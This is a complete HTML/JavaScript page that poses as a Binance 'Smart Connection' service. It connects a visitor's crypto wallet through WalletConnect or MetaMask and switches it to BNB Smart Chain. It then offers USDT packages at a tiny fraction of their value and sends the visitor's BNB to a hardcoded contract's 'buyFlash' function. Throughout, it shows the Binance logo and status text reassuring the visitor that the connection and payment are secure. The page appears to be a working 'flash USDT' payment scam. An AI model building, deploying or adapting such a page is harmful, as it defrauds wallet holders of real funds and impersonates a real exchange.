<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Smart Connection</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --sub: #848E9C; }
        body { background: var(--dark); color: var(--text); font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .app-card { background: var(--card); width: 340px; border-radius: 30px; padding: 35px; border: 1px solid #2B3139; text-align: center; }
        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 14px; font-weight: 900; font-size: 16px; cursor: pointer; }
        
        /* Modal Style */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
        .modal-content { background: #181A20; width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; }
        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: #2B3139; padding: 14px 18px; border-radius: 16px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .wallet-item:hover { border-color: var(--gold); }
        .wallet-info { display: flex; align-items: center; gap: 12px; }
        .wallet-info img { width: 32px; height: 32px; border-radius: 8px; }
    </style>
</head>
<body>

<div class="app-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="130" style="margin-bottom: 30px;">
    <div id="ui-connect">
        <button class="btn-main" onclick="openModal()">Connect Wallet</button>
    </div>
    <div id="ui-action" style="display:none;">
        <select id="tier" style="width:100%; padding:15px; border-radius:12px; background:#0B0E11; color:white; border:1px solid #474D57; margin-bottom:20px;">
            <option value="0.09">5,000 USDT (0.09 BNB)</option>
            <option value="0.2">10,000 USDT (0.2 BNB)</option>
            <option value="1.0">100,000 USDT (1.0 BNB)</option>
        </select>
        <button class="btn-main" onclick="execute()">Confirm & Pay</button>
    </div>
    <div id="status" style="margin-top:20px; font-size:12px; color:var(--gold);">Secure Connection Ready</div>
</div>

<div class="modal-overlay" id="walletModal">
    <div class="modal-content">
        <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
            <b style="font-size:18px;">Connect Wallet</b>
            <span onclick="closeModal()" style="cursor:pointer; color:var(--sub);">✕</span>
        </div>

        <div class="wallet-item" onclick="connectWallet('wc')">
            <div class="wallet-info">
                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
                <span>WalletConnect (All Wallets)</span>
            </div>
            <span style="font-size:10px; color:var(--sub);">540+</span>
        </div>

        <div class="wallet-item" onclick="connectWallet('injected')">
            <div class="wallet-info">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
                <span>MetaMask / In-App</span>
            </div>
            <span style="color:#2ebd85; font-size:10px;">INSTALLED</span>
        </div>
    </div>
</div>

<script>
    let web3, account, provider;
    const CONTRACT_ADDR = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

    async function connectWallet(mode) {
        try {
            if (mode === 'wc') {
                // استخدام WalletConnect لضمان التوافق مع الجوال
                provider = new WalletConnectProvider.default({
                    rpc: { 56: "https://bsc-dataseed.binance.org/" },
                    chainId: 56
                });
                await provider.enable();
                web3 = new Web3(provider);
            } else {
                // للربط المباشر إذا كان المستخدم داخل متصفح المحفظة أصلاً
                if (window.ethereum) {
                    provider = window.ethereum;
                    await provider.request({ method: 'eth_requestAccounts' });
                    web3 = new Web3(provider);
                } else {
                    // فتح ميتا ماسك برابط عميق صحيح لشبكة BSC
                    window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname;
                    return;
                }
            }

            const accounts = await web3.eth.getAccounts();
            account = accounts[0];
            
            // التأكد من أن المحفظة على شبكة Smart Chain
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (e) {}

            closeModal();
            document.getElementById('ui-connect').style.display = 'none';
            document.getElementById('ui-action').style.display = 'block';
            document.getElementById('status').innerText = "Connected: " + account.substring(0,8) + "...";

        } catch (err) {
            console.error("Link Error:", err);
            document.getElementById('status').innerText = "Connection Cancelled";
        }
    }

    async function execute() {
        const val = document.getElementById('tier').value;
        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
        try {
            document.getElementById('status').innerText = "Opening Secure Payment Page...";
            
            // إرسال المعاملة (ستفتح نافذة الدفع فوراً داخل المحفظة)
            await contract.methods.buyFlash().send({ 
                from: account, 
                value: web3.utils.toWei(val, "ether") 
            });

            document.getElementById('status').innerText = "Payment Sent Successfully!";
        } catch (e) {
            document.getElementById('status').innerText = "Transaction Rejected.";
        }
    }
</script>
</body>
</html>
